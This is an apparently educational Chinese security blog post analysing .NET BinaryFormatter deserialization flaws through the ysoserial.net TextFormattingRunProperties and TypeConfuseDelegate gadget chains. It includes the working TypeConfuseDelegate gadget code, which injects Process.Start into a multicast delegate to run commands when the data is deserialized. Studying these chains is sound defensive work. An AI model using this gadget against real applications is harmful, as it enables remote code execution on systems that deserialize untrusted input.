# Dot NET-BinaryFormatter反序列化漏洞

  
  
&lt;!--more--&gt;  
## BinaryFormatter  
`BinaryFormatter`将对象序列化为二进制流，命名空间位于`System.Runtime.Serialization.Formatters.Binary`。  
### 命名空间接口  
存在多个序列化和反序列化方法，并且实现了`IRemotingFormatter`, `IFormatter`两个接口。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091249767.png)
## 攻击链  
`yso.net`中所有的`gadget`都支持`BinaryFormatter`，其原因是`TextFormattingRunProperties`链。  
### TextFormattingRunProperties  
其产生漏洞的主要原因就是`Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties`的序列化构造函数中，存在`this.GetObjectFromSerializationInfo(&#34;ForegroundBrush&#34;, info)`方法。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091310491.png)
很明显这里`XmlReader.Parse(string)`是存在漏洞的。  
整个链的流程就是  
  
- 自写一个TextFormattingRunPropertiesMarshal类实现ISerializable接口  
- 在GetObjectData序列化时给ForegroundBrush字段赋值为xaml的payload，并且将对象类型赋值为TextFormattingRunProperties类。  
- 在反序列化时触发反序列化构造函数  
- 反序列化构造函数触发`XamlReader.Parse(string)`来RCE。  
  
此链子限制`Microsoft.PowerShell.Editor.dll`。  
### TypeConfuseDelegate  
`TypeConfuseDelegate`类型混淆委托。  
#### 委托和多播委托  
委托本质上是一个存有方法引用的变量，来创建一个委托  
```c#  
class Program  
{  
	public delegate void MyDelegate(string s);  
  
	public static void PrintString(string s)  
	{  
		Console.WriteLine(s);  
	}  
	static void Main(string[] args)  
	{  
		MyDelegate myDelegate = new MyDelegate(PrintString);  
		myDelegate(&#34;Delegate&#34;);  
	}  
}  
```  
传递给委托的方法签名必须和定义的委托签名一致，就是返回值、参数一致。  
多播委托就是持有对委托列表的引用，把多播委托想象成一个列表，将委托的方法加入列表中，多播委托会按顺序依次调用每个委托。  
```c#  
class Program  
{  
    public delegate void MyDelegate(string s);  
  
    public static void PrintString(string s)  
    {  
        Console.WriteLine($&#34;print {s} to screen.&#34;);  
    }  
    public static void WriteToFile(string s)  
    {  
        Console.WriteLine($&#34;write {s} to file.&#34;);  
    }  
    static void Main(string[] args)  
    {  
        MyDelegate myDelegate = new MyDelegate(PrintString);  
        MyDelegate myDelegate1 = new MyDelegate(WriteToFile);  
        myDelegate &#43;= myDelegate1;  
        myDelegate(&#34;hello&#34;);  
    }  
}  
// Output  
print hello to screen.  
write hello to file.  
```  
通过&#43;=的形式添加多个委托，还可以使用`MulticastDelegate.Combine(printString, writeFile)`的形式。  
#### SortedSet and Comparer  
Demo  
```c#  
using System;  
using System.Collections;  
using System.Collections.Generic;  
  
namespace BinaryFormatterSerialize  
{  
    public class ByFileExtension : IComparer&lt;string&gt;  
    {  
        string xExt, yExt;  
  
        CaseInsensitiveComparer caseiComp = new CaseInsensitiveComparer();  
  
        public int Compare(string x, string y)  
        {  
            // Parse the extension from the file name.  
            xExt = x.Substring(x.LastIndexOf(&#34;.&#34;) &#43; 1);  
            yExt = y.Substring(y.LastIndexOf(&#34;.&#34;) &#43; 1);  
  
            // Compare the file extensions.  
            int vExt = caseiComp.Compare(xExt, yExt);  
            if (vExt != 0)  
            {  
                return vExt;  
            }  
            else  
            {  
                // The extension is the same,  
                // so compare the filenames.  
                return caseiComp.Compare(x, y);  
            }  
        }  
    }  
    class Program  
    {  
        public static void Main(string[] args)  
        {  
            var set = new SortedSet&lt;string&gt;(new ByFileExtension());  
            set.Add(&#34;test.c&#34;);  
            set.Add(&#34;test.b&#34;);  
            set.Add(&#34;test.a&#34;);  
            foreach (var item in set)  
            {  
                Console.WriteLine(item.ToString());  
            }  
            Console.ReadKey();  
        }  
    }  
}  
  
// 输出  
test.a  
test.b  
test.c  
```  
向`set`集合中添加`test.c`、`test.b`、`test.a`按照后缀会被自动排序。自动排序的前提是必须要有两个以上的元素，即第二次添加的时候才会自动排序。  
其中`ByFileExtension`比较器，实现了`IComparer&lt;string&gt;`接口，重写了`Compare()`方法，返回`int`值。  
#### Ysoserial.net Gadget  
```c#  
Delegate da = new Comparison&lt;string&gt;(String.Compare);  
Comparison&lt;string&gt; d = (Comparison&lt;string&gt;)MulticastDelegate.Combine(da, da);  
IComparer&lt;string&gt; comp = Comparer&lt;string&gt;.Create(d);  
SortedSet&lt;string&gt; set = new SortedSet&lt;string&gt;(comp);  
```  
其中存在一个`Comparer&lt;string&gt;.Create();`方法，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091432274.png)
实例化了一个`ComparisonComparer`类，他的参数是一个`Comparison&lt;T&gt;`泛型委托。  
其中继承了`Comparer`抽象类，这个抽象类继承了`IComparer&lt;T&gt;`接口，重写了`compare`方法。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091439936.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091438425.png)
重写的`compare()`方法中，其中执行了我们最开始传入的委托所代表的方法。  
此时，我们再来看一下`Comparison&lt;T&gt;`泛型委托是什么？他能委托什么方法呢？  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091445424.png)
它限制了传入的参数类型是`&lt;in T&gt;`，但是在`Ysoserial.net`中`Gadget`利用到了`Process.Start()`，他的重载方法中，只有两个`string`类型的函数  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091451861.png)
刚才在上述的Demo中，有这样一句话`传递给委托的方法签名必须和定义的委托签名一致，就是返回值、参数一致。`  
那我们如何解决这个问题？传入两个`string`类型的参数呢？  
这需要用到多播委托。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091454874.png)
传入一个`string`的比较器  
```c#  
Delegate da = new Comparison&lt;string&gt;(String.Compare);  
Comparison&lt;string&gt; d = (Comparison&lt;string&gt;)MulticastDelegate.Combine(da, da);  
```  
为什么多播委托可以解决方法签名不一致的问题呢？  
作者给出的解释  
```  
The only weird thing about this code is TypeConfuseDelegate. It’s a long standing issue that .NET delegates don’t always enforce their type signature, especially the return value. In this case we create a two entry multicast delegate (a delegate which will run multiple single delegates sequentially), setting one delegate to String::Compare which returns an int, and another to Process::Start which returns an instance of the Process class. This works, even when deserialized and invokes the two separate methods. It will then return the created process object as an integer, which just means it will return the pointer to the instance of the process object.  
```  
最后的`Gadget`  
```c#  
 public static object TypeConfuseDelegateGadget(InputArgs inputArgs)  
 {  
     string cmdFromFile = inputArgs.CmdFromFile;  
  
     if (!string.IsNullOrEmpty(cmdFromFile))  
     {  
         inputArgs.Cmd = cmdFromFile;  
     }  
       
     Delegate da = new Comparison&lt;string&gt;(String.Compare);  
     Comparison&lt;string&gt; d = (Comparison&lt;string&gt;)MulticastDelegate.Combine(da, da);  
     IComparer&lt;string&gt; comp = Comparer&lt;string&gt;.Create(d);  
     SortedSet&lt;string&gt; set = new SortedSet&lt;string&gt;(comp);  
     set.Add(inputArgs.CmdFileName);  
     if (inputArgs.HasArguments)  
     {  
         set.Add(inputArgs.CmdArguments);  
     }  
     else  
     {  
         set.Add(&#34;&#34;);  
     }  
       
     FieldInfo fi = typeof(MulticastDelegate).GetField(&#34;_invocationList&#34;, BindingFlags.NonPublic | BindingFlags.Instance);  
     object[] invoke_list = d.GetInvocationList();  
     // Modify the invocation list to add Process::Start(string, string)  
     invoke_list[1] = new Func&lt;string, string, Process&gt;(Process.Start);  
     fi.SetValue(d, invoke_list);  
  
     return set;  
 }  
 ```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506091526926.png)
  
  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/dot-net-binaryformatter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/  

